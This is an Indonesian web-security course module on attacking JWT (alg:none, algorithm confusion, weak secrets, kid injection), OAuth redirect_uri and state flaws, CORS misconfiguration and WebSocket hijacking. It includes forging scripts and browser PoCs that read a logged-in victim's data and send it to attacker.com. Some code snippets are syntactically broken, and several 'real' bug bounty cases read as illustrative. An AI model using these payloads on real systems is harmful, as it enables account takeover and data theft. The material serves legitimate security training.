# Sesi 21 — OAuth, JWT & CORS / WebSocket

> **Level:** Intermediate–Advanced  
> **Durasi Estimasi:** 5–6 jam (teori + praktik)  
> **Prasyarat:** Sesi 02 (HTTP), Sesi 06 (Broken Auth), Sesi 08 (XSS)  
> **Tools:** Burp Suite, jwt_tool, Browser DevTools, jwt.io

---

## 🎯 Tujuan Pembelajaran

Setelah menyelesaikan sesi ini, peserta mampu:
- Menganalisis dan manipulasi JWT (alg:none, algorithm confusion RS256→HS256)
- Mengidentifikasi OAuth 2.0 misconfiguration (state bypass, redirect_uri manipulation)
- Menemukan dan exploit CORS misconfiguration untuk data theft
- Mengidentifikasi Cross-Site WebSocket Hijacking (CSWSH)
- Chain OAuth + JWT + CORS ke full Account Takeover
- Menggunakan jwt_tool untuk automated JWT testing

---

## 📚 Bagian 1 — JWT (JSON Web Token)

### 1.1 Anatomy JWT

```
JWT terdiri dari 3 bagian yang di-encode Base64url, dipisahkan titik (.):

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9   ← HEADER
.eyJzdWIiOiIxMjM0IiwicmVsZSI6InVzZXIifQ  ← PAYLOAD  
.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c  ← SIGNATURE

Header decode (Base64):
{
  "alg": "HS256",   ← algoritma signing
  "typ": "JWT"
}

Payload decode (Base64):
{
  "sub": "1234",    ← subject (user ID)
  "role": "user",
  "iat": 1700000000,  ← issued at
  "exp": 1700003600   ← expiry
}
```

### 1.2 Attack 1 — Algorithm None (alg:none)

```
Konsep: Server tidak memvalidasi signature jika algorithm di-set ke "none"

Normal:
Header: {"alg": "HS256", "typ": "JWT"}

Manipulasi:
Header: {"alg": "none", "typ": "JWT"} atau {"alg": "None"}

Jika server menerima alg:none tanpa verifikasi → JWT tanpa signature valid!
```

```python
import base64
import json

def b64url_encode(data):
    """Encode ke Base64URL tanpa padding"""
    if isinstance(data, dict):
        data = json.dumps(data, separators=(',', ':')).encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

def create_none_jwt(header_payload):
    """Buat JWT dengan alg:none"""
    header = {"alg": "none", "typ": "JWT"}
    payload = header_payload  # ubah sesuai kebutuhan
    
    header_enc = b64url_encode(header)
    payload_enc = b64url_encode(payload)
    
    # Tidak ada signature!
    return f"{header_enc}.{payload_enc}."

# Contoh: ubah role dari "user" ke "admin"
malicious_payload = {
    "sub": "1234",
    "role": "admin",   ← ubah role
    "iat": 1700000000,
    "exp": 9999999999  ← extend expiry
}

token = create_none_jwt(malicious_payload)
print(f"Manipulated JWT: {token}")
# Test kirim ke API dengan token ini
```

### 1.3 Attack 2 — Algorithm Confusion (RS256 → HS256)

```
Konsep:
- RS256: asymmetric, server sign dengan PRIVATE key, verify dengan PUBLIC key
- HS256: symmetric, server sign DAN verify dengan SECRET yang sama

Serangan:
Jika server menggunakan RS256 tapi tidak menolak HS256:
1. Ambil PUBLIC key server (sering accessible: /jwks.json, /.well-known/jwks.json)
2. Sign token JWT baru menggunakan HS256 dengan PUBLIC key sebagai "secret"
3. Kirim ke server
4. Server verifikasi HS256 menggunakan public key → berhasil!
   (karena server tidak memvalidasi bahwa algorithm yang diterima sesuai ekspektasi)
```

```bash
# Temukan public key
curl https://target.com/.well-known/jwks.json
curl https://target.com/api/auth/keys
# Response: {"keys": [{"kty": "RSA", "n": "...", "e": "AQAB", "kid": "..."}]}

# Gunakan jwt_tool untuk confusion attack
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool
pip3 install -r requirements.txt

# Dapatkan original JWT
JWT="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0IiwicGVybWlzc2lvbiI6InVzZXIifQ.SIGNATURE"

# Algorithm confusion attack
python3 jwt_tool.py $JWT -X k -pk public_key.pem
# jwt_tool akan:
# 1. Konversi public key ke HS256 format
# 2. Sign ulang token dengan HS256
# 3. Generate token yang mungkin diterima server
```

### 1.4 Attack 3 — JWT Claim Manipulation

```python
import jwt  # pip install pyjwt

# Jika secret lemah (bisa brute-force) atau ada JWT debug mode

# Test common weak secrets
import subprocess
result = subprocess.run(
    ['python3', 'jwt_tool.py', TOKEN, '-C', '-d', 'common_secrets.txt'],
    capture_output=True
)

# Jika secret ditemukan, sign token baru dengan role admin
import jwt
weak_secret = "secret"  # secret yang ditemukan
payload = {
    "sub": "user123",
    "role": "admin",      ← escalate
    "exp": 9999999999
}
new_token = jwt.encode(payload, weak_secret, algorithm='HS256')
```

### 1.5 Attack 4 — JWT kid (Key ID) Injection

```json
// JWT header dengan kid (Key ID)
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "key-1"
}

// Server lookup key berdasarkan kid
// Jika lookup menggunakan SQL: SELECT key FROM keys WHERE kid = 'key-1'
// Maka kid bisa di-inject!

// SQL injection via kid:
{
  "alg": "HS256",
  "kid": "' UNION SELECT 'attacker_controlled_secret'-- -"
}
// Server HMAC verify menggunakan 'attacker_controlled_secret'!

// Path traversal via kid (jika key diload dari file):
{
  "alg": "HS256",
  "kid": "../../../dev/null"
}
// Server baca /dev/null → empty string → sign dengan empty string sebagai secret!
```

---

## 📚 Bagian 2 — OAuth 2.0 Vulnerabilities

### 2.1 OAuth 2.0 Flow Overview

```
Authorization Code Flow (paling umum):

1. User klik "Login with Google"
2. App redirect ke: https://accounts.google.com/oauth/authorize
   ?client_id=APP_ID
   &redirect_uri=https://target.com/callback    ← penting!
   &response_type=code
   &scope=email profile
   &state=RANDOM_STRING    ← CSRF protection!

3. User login di Google → approve permissions
4. Google redirect ke: https://target.com/callback
   ?code=AUTH_CODE
   &state=RANDOM_STRING

5. App tukar code dengan token:
   POST https://accounts.google.com/oauth/token
   {code: AUTH_CODE, client_id: ..., client_secret: ..., redirect_uri: ...}

6. Google return access_token + id_token
7. App login user berdasarkan token
```

### 2.2 Attack 1 — State Parameter Missing / Weak (OAuth CSRF)

```http
# Jika state parameter tidak ada atau tidak divalidasi
# Attacker bisa buat link OAuth yang akan login korban ke akun attacker

# Step 1: Attacker mulai OAuth flow untuk akun attacker
# Capture authorization URL sebelum approve:
https://accounts.google.com/oauth/authorize?client_id=APP_ID
  &redirect_uri=https://target.com/callback
  &response_type=code
  &state=PREDICTABLE_OR_MISSING

# Step 2: Attacker buat link yang berisi auth code yang digenerate untuk akun attacker
# Kirim ke korban yang sudah login di target.com

# Step 3: Korban klik link → callback dieksekusi → korban login ke akun attacker!
# Jika korban memasukkan data (payment, dll) → attacker lihat!
```

### 2.3 Attack 2 — redirect_uri Manipulation

```http
# Normal: redirect_uri harus persis sama dengan yang terdaftar
# Beberapa server melakukan validasi lemah

# Test manipulasi redirect_uri:

# 1. Menambahkan subdirectory
redirect_uri=https://target.com/callback/../../evil

# 2. Menambahkan subdomain
redirect_uri=https://evil.target.com/callback

# 3. Open redirect dalam domain
redirect_uri=https://target.com/redirect?url=https://attacker.com

# 4. Parameter pollution
redirect_uri=https://target.com/callback&redirect_uri=https://attacker.com

# 5. Fragment manipulation
redirect_uri=https://target.com/callback#

# Jika auth code dikirim ke attacker via redirect_uri:
# Attacker tukar code dengan access token → FULL ATO!
```

### 2.4 Attack 3 — Token Leakage via Referer

```http
# Implicit flow: token ada di URL fragment atau query string
https://target.com/callback?access_token=SECRET_TOKEN&token_type=bearer

# Jika halaman callback memiliki resource eksternal (gambar, script, dll):
<img src="https://analytics.example.com/track.png">
# Browser kirim Referer header yang mengandung token!
# Referer: https://target.com/callback?access_token=SECRET_TOKEN

# Attacker yang kontrol analytics.example.com bisa lihat token!
```

---

## 📚 Bagian 3 — CORS Misconfiguration

### 3.1 Konsep CORS

```
Same-Origin Policy (SOP): browser blokir JS read response dari domain berbeda
CORS: mekanisme untuk relaksasi SOP dengan aturan

Normal CORS flow:
Browser (evil.com) → Request ke api.target.com
api.target.com → Response dengan header:
  Access-Control-Allow-Origin: https://trusted-partner.com  ← hanya izin ini
  Access-Control-Allow-Credentials: true

Browser: "origin evil.com tidak di daftar izin" → BLOKIR response

CORS Bug: policy terlalu longgar
  Access-Control-Allow-Origin: https://evil.com  ← diberi izin!
  Access-Control-Allow-Credentials: true
→ JS di evil.com bisa baca response dari api.target.com (termasuk data sensitif!)
```

### 3.2 Testing CORS

```http
# Test 1: Kirim Origin header dengan domain attacker
GET /api/user/data HTTP/1.1
Host: api.target.com
Origin: https://attacker.com
Cookie: session=victim_session

# Jika response mengandung:
Access-Control-Allow-Origin: https://attacker.com   ← reflect origin attacker!
Access-Control-Allow-Credentials: true
→ CORS misconfiguration confirmed!

# Test 2: Null origin
Origin: null
# Beberapa server whitelist "null" origin (from sandboxed iframes)
# Jika di-reflect: bisa exploit via sandboxed iframe!

# Test 3: Subdomain bypass
Origin: https://evil.target.com
Origin: https://target.com.attacker.com
Origin: https://attackertarget.com  ← regex yang buruk .*target.com.*
```

### 3.3 Exploiting CORS Misconfiguration

```html
<!-- evil.html di attacker.com -->
<!-- Exploit CORS misconfiguration untuk steal data -->
<script>
fetch('https://api.target.com/api/user/profile', {
  credentials: 'include'  // ← kirim cookie victim!
})
.then(response => response.json())
.then(data => {
  // Data sensitif victim berhasil dibaca!
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify(data)
  });
})
.catch(err => console.log('CORS protected:', err));
</script>

<!-- Pastikan:
1. Victim sudah login di target.com (punya valid session cookie)
2. api.target.com reflect Origin dari attacker.com
3. Access-Control-Allow-Credentials: true
→ Data profile victim berhasil di-exfil! -->
```

### 3.4 CORS dengan Null Origin via Sandboxed iframe

```html
<!-- Bypass CORS yang hanya whitelist "null" origin -->
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" 
        src="data:text/html,
<script>
fetch('https://api.target.com/api/user/sensitive', {
  credentials: 'include'
})
.then(r => r.json())
.then(d => {
  top.location = 'https://attacker.com/steal?d=' + btoa(JSON.stringify(d))
})
</script>">
</iframe>
<!-- Sandboxed iframe menghasilkan Origin: null
     Jika server whitelist null → data ter-exfil! -->
```

---

## 📚 Bagian 4 — WebSocket Security

### 4.1 Cross-Site WebSocket Hijacking (CSWSH)

```
WebSocket tidak otomatis memvalidasi Origin request
Jika server tidak cek Origin header → any website bisa connect ke WebSocket!

Normal WebSocket upgrade:
GET /ws HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Origin: https://target.com    ← browser kirim ini
Sec-WebSocket-Key: random=

Server seharusnya cek: apakah Origin di whitelist?
Jika tidak cek → CSWSH!
```

```javascript
// CSWSH PoC — dari evil.com, hijack WebSocket session victim
// (victim harus mengunjungi halaman ini saat sudah login di target.com)

var ws = new WebSocket('wss://target.com/ws');

ws.onopen = function() {
    console.log('[*] WebSocket connected!');
    // Session cookie dikirim otomatis saat upgrade (jika tidak HttpOnly)
    // atau server authenticate via existing session
};

ws.onmessage = function(event) {
    console.log('[+] Data received:', event.data);
    // Kirim data ke attacker server
    fetch('https://attacker.com/ws-data', {
        method: 'POST',
        body: event.data
    });
};

ws.onerror = function(error) {
    console.log('[-] Error:', error);
};
```

### 4.2 Mengidentifikasi WebSocket di Burp

```
Burp Suite → Proxy → WebSockets history tab
(tab terpisah dari HTTP History)

Yang harus diperiksa:
1. Apakah handshake cek Origin?
2. Apakah WebSocket messages mengandung data sensitif tanpa additional auth?
3. Apakah message format JSON yang bisa dimanipulasi (IDOR via WebSocket)?
4. Apakah ada CSRF protection untuk WebSocket?
```

---

## 📚 Bagian 5 — Chaining: OAuth + JWT + CORS

### 5.1 Contoh Chain Attack: OAuth ATO

```
Chain: Weak redirect_uri validation + Token in URL + CORS misconfiguration

Step 1: Temukan OAuth endpoint dengan validasi redirect_uri lemah
https://target.com/oauth/authorize?
  client_id=APP_ID&
  redirect_uri=https://target.com/oauth/callback/../redirect?url=https://attacker.com&
  response_type=token&
  scope=read

Step 2: Korban klik link OAuth → token dikirim ke attacker.com
https://attacker.com/#access_token=VICTIM_TOKEN&token_type=bearer

Step 3: Gunakan token untuk akses API
GET /api/user/profile HTTP/1.1
Authorization: Bearer VICTIM_TOKEN

→ Full account access!
```

### 5.2 Chain: CORS + CSRF → ATO

```javascript
// Exploit CORS + buat perubahan via CSRF dalam satu request chain

// 1. Baca CSRF token via CORS
fetch('https://target.com/settings', {
  credentials: 'include'
})
.then(r => r.text())
.then(html => {
  // Extract CSRF token dari HTML
  const match = html.match(/csrf_token['"]\s*value=['"]([^'"]+)['"]/);
  if (match) {
    const csrfToken = match[1];
    
    // 2. Gunakan CSRF token untuk buat perubahan
    return fetch('https://target.com/settings/update-email', {
      method: 'POST',
      credentials: 'include',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
      },
      body: `email=attacker@evil.com&csrf_token=${csrfToken}`
    });
  }
})
.then(r => {
  // 3. Exfil confirmation
  fetch('https://attacker.com/done?status=' + r.status);
});
```

---

## 🔴 Real Bug Bounty Cases

### Case 1 — OAuth Account Takeover di Booking.com (Real Pattern)

> **Referensi:** Pola dari multiple OAuth ATO reports di HackerOne  
> **Severity:** Critical

**Skenario:**
Booking.com memiliki "Login with Facebook" feature. Peneliti menemukan bahwa `redirect_uri` tidak di-validasi dengan ketat — subdomain dari booking.com bisa digunakan.

```http
# Attacker menemukan open redirect di subdomain:
https://help.booking.com/redirect?url=https://attacker.com

# Crafted OAuth URL yang mengirim token ke attacker
https://www.facebook.com/dialog/oauth?
  client_id=BOOKING_APP_ID&
  redirect_uri=https://help.booking.com/redirect?url=https://attacker.com&
  response_type=token&
  scope=email

# Flow: Facebook → redirect ke help.booking.com/redirect → redirect ke attacker.com
# Token ada di URL fragment yang attacker bisa baca
```

---

### Case 2 — JWT Algorithm Confusion di Auth0 (Real Research)

> **Source:** PortSwigger Research / Auth0 Security Analysis  
> **Referensi:** [PortSwigger JWT Attack Research](https://portswigger.net/research/critical-new-jwt-authentication-bypass)  
> **Severity:** Critical

**Detail:**
Beberapa implementasi JWT verification library rentan terhadap algorithm confusion. Jika server menggunakan RS256 secara default tapi tidak menolak HS256, attacker bisa sign token baru menggunakan public key sebagai HMAC secret.

```python
# Ambil public key dari JWKS endpoint
import requests, json
jwks = requests.get('https://target.com/.well-known/jwks.json').json()
public_key = jwks['keys'][0]  # ambil key pertama

# Convert JWKS ke PEM format (menggunakan cryptography library)
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
from cryptography.hazmat.backends import default_backend
import base64

# ... konversi ke PEM ...

# Sign token baru dengan HS256 menggunakan public key sebagai secret
import jwt
payload = {"sub": "admin", "role": "admin", "exp": 9999999999}
malicious_token = jwt.encode(payload, pem_public_key, algorithm="HS256")
```

---

### Case 3 — CORS Misconfiguration di Yahoo (Real — 2013 Disclosed)

> **Platform:** Yahoo Bug Bounty  
> **Researcher:** Multiple researchers  
> **Severity:** High

**Detail:**
Yahoo memiliki beberapa API endpoint yang merefleksikan Origin header secara naif tanpa whitelist yang benar. Endpoint tersebut juga memiliki `Access-Control-Allow-Credentials: true`.

```http
# Request
GET /api/user/mail HTTP/1.1
Host: mail.yahoo.com
Origin: https://evil.com
Cookie: Y=[victim_session]

# Response
Access-Control-Allow-Origin: https://evil.com  ← reflect!
Access-Control-Allow-Credentials: true

{"email_list": [...], "drafts": [...]}  ← data mail victim ter-expose!
```

---

### Case 4 — JWT None Algorithm di Firebase (Pattern)

> **Referensi:** Pola dari alg:none bypass yang pernah ada di beberapa library  
> **Severity:** Critical

**Skenario:**
Library JWT versi lama di beberapa implementasi tidak menangani alg:none dengan benar. Sebuah token dengan algorithm "None" (dengan huruf capital) atau "nOnE" melewati signature verification.

```
Testing alg:none variations:
- "none"
- "None"
- "NONE"
- "nOnE"
- "" (empty string)
- false
- null

jwt_tool untuk automated test:
python3 jwt_tool.py [TOKEN] -X a
→ Otomatis test semua variasi alg:none
```

---

## 🛠️ Lab Praktik

### Lab 1 — PortSwigger Web Academy (Gratis)
- 🔗 [JWT authentication bypass via unverified signature](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature)
- 🔗 [JWT authentication bypass via algorithm confusion](https://portswigger.net/web-security/jwt/algorithm-confusion/lab-jwt-authentication-bypass-via-algorithm-confusion)
- 🔗 [OAuth account hijacking via redirect_uri](https://portswigger.net/web-security/oauth/lab-oauth-account-hijacking-via-redirect-uri)
- 🔗 [CORS vulnerability with basic origin reflection](https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack)
- 🔗 [CORS vulnerability with trusted null origin](https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack)

### Lab 2 — TryHackMe
- 🔗 [JSON Web Token Attacks](https://tryhackme.com/room/jsonwebtoken)

### Lab 3 — jwt_tool Practice
```bash
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool
pip3 install -r requirements.txt

# Test semua serangan JWT
python3 jwt_tool.py [TOKEN] --all
python3 jwt_tool.py [TOKEN] -X a    # alg confusion
python3 jwt_tool.py [TOKEN] -X n    # alg:none
python3 jwt_tool.py [TOKEN] -C -d /usr/share/wordlists/rockyou.txt  # brute secret
```

### Lab 4 — HackTheBox Academy
- 🔗 [Attacking Authentication Mechanisms (JWT section)](https://academy.hackthebox.com/module/details/80)

---

## 📋 JWT / OAuth / CORS Testing Checklist

```markdown
## JWT Checklist
- [ ] Decode token di jwt.io → lihat semua claims
- [ ] Test alg:none (none, None, NONE, nOnE)
- [ ] Cek apakah HS256 diterima padahal RS256 expected
- [ ] Ambil /jwks.json atau /.well-known/jwks.json
- [ ] Brute force weak secret (jwt_tool -C)
- [ ] kid manipulation (path traversal, SQL injection)
- [ ] Manipulasi claim role/admin tanpa valid signature

## OAuth Checklist
- [ ] State parameter ada dan divalidasi?
- [ ] redirect_uri bisa dimanipulasi?
- [ ] Open redirect di domain target + redirect_uri chain?
- [ ] Token di URL → Referer leakage?
- [ ] Authorization code reuse?

## CORS Checklist
- [ ] Kirim Origin: https://attacker.com → di-reflect?
- [ ] Origin: null → di-reflect?
- [ ] Subdomain target → di-reflect?
- [ ] Access-Control-Allow-Credentials: true ada?
- [ ] Buat PoC fetch dengan credentials: include
```

---

## 📖 Referensi & Bacaan Lanjutan

| Sumber | Link | Topik |
|--------|------|-------|
| PortSwigger | [JWT Attacks](https://portswigger.net/web-security/jwt) | Complete JWT guide |
| PortSwigger | [OAuth Vulnerabilities](https://portswigger.net/web-security/oauth) | OAuth testing |
| PortSwigger | [CORS Guide](https://portswigger.net/web-security/cors) | CORS misconfig |
| jwt_tool | [GitHub](https://github.com/ticarpi/jwt_tool) | JWT testing tool |
| OWASP | [JWT Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html) | Defense |
| oauth.net | [OAuth 2.0 Security Best Practices](https://oauth.net/2/security-best-practices/) | OAuth defense |

---

## 🔑 Key Takeaways

1. **JWT signature tidak selalu diverifikasi** — alg:none dan algorithm confusion adalah bug yang masih ada
2. **OAuth = tiga attack surface** — state (CSRF), redirect_uri (ATO), token handling (leakage)
3. **CORS + Credentials: true = data theft** — jika origin di-reflect dan credentials dikirim, semua data API bisa dibaca cross-origin
4. **WebSocket Origin check sering dilupakan** — banyak implementasi WS tidak validasi Origin
5. **jwt_tool wajib dikuasai** — mengotomasi test yang kalau manual butuh waktu lama

---

*Sesi berikutnya: **Sesi 17 — Race Conditions***
